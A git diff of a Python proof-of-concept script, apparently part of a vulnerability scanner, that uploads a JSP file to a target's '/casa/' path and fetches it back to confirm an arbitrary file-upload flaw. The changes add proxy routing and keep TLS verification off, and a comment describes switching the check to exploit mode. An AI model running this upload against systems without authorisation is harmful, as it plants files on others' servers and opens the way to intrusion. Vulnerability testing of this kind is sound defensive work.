@@ -3,11 +3,12 @@
 
 import requests
 import io
-from Config.config_requests import ua
-import requests.packages.urllib3
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -36,10 +37,10 @@ def poc(target,exp=None):
         }
         filename1 = "abctestabc.jsp"
         mem_string = poc_content(filename1)
-        res = requests.post(url, headers=headers, data=mem_string.read(), verify=False, timeout=5)
+        res = requests.post(url, headers=headers, data=mem_string.read(), verify=False, timeout=5,proxies=proxies)
         if res.status_code == 200:
             poc_url = target + "/casa/%s" %filename1
-            poc_res = requests.get(poc_url, headers=headers, verify=False, timeout=5)
+            poc_res = requests.get(poc_url, headers=headers, verify=False, timeout=5,proxies=proxies)
             if "this is a friendly test, Please check and repair upload vulnerabilities." in poc_res.text:
             # if  poc_res.status_code == 200:            # exp的时候作为判断使用，注释掉上面一句判断，并取消这个注释
                 result['poc'] = NAME
